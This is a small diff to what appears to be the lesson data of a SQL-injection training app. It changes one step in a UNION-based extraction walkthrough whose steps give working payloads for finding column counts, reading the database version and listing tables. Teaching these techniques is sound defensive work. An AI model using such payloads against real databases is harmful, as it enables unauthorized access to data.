@@ -49,7 +49,7 @@ row = conn.execute(query)  # ← executes attacker SQL`,
     demoUrl: "/sqli/search",
     what: "Once SQL injection is confirmed, UNION-based extraction lets attackers append a second SELECT to the original query. The result of both queries is returned together — attacker sees data from any table.",
     how: [
-      { n:"1", text:"Find column count: ", code:"' ORDER BY 1-- ... ORDER BY 3-- (error = found it)" },
+      { n:"1", text:"Find column count: ", code:"' ORDER BY 1-- ... ORDER BY 4-- (error = found it)" },
       { n:"2", text:"Find string columns: ", code:"' UNION SELECT NULL,'a',NULL--  (look for 'a' in output)" },
       { n:"3", text:"Extract version/db: ", code:"' UNION SELECT NULL,version(),database()--" },
       { n:"4", text:"List tables: ", code:"' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--" },
